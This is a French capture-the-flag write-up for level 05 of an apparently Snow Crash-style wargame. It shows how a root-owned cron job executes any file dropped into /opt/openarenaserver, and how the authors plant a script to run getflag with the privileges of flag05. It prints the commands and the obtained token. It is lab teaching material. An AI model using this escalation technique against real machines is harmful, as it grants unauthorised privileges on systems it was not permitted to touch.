# Level 05

Cette fois ci, il n'existe aucun fichier dans le home de l'utilisateur `level05`, par reflex nous avons exécuté la commande magique `find`

```shell
~ find / -name level05 2> /tmp/error
/var/mail/level05
/rofs/var/mail/level05
```

Level 05 à donc reçu un mail.

```shell
~ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Le contenu du mail est une `crontab` qui execute avec les privilèges de `flag05` la commande `sh /usr/sbin/openarenaserver` toutes les 2 minutes.

On s'est demandée ce que fessait `/usr/sbin/openarenaserver`, selon sa façon d'être exécuter c'est un script `shell`, on doit pouvoir le cat

```shell
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Le script récupère donc tous les fichiers dans `/opt/openarenaserver` et les executes avec `bash`, puis les supprimes

Nous avons donc `scp` un script bash qui appel la commande `getflag` et redirige la sortie dans un fichier dans `/tmp`

```shell
~ scp -P 4242 script level05@192.168.56.101:/opt/openarenaserver
level05@192.168.56.101s password:
script                                          100%   37    28.7KB/s   00:00
~ chmod 777 /opt/openarenaserver/script
~ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
~ su level06
Password:
```

